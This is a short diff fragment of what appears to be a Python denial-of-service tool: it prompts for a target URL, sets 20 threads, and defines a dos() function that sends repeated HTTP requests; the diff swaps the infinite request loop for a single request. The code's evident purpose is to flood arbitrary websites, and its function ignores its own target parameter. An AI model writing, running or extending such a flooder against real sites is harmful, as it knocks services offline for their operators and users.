@@ -26,12 +26,7 @@ print("")
 input("Press ENTER to continue ")
 print("")
 def dos(target):
-    while True:
-        try:
-            res = requests.get(url)
-        except requests.exceptions.ConnectionError:
-            clearterminal()
-            printinfo()
+    res = requests.get(url)
 threads = 20        
 url = input("Target URL [https://example.com]: ")
 if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
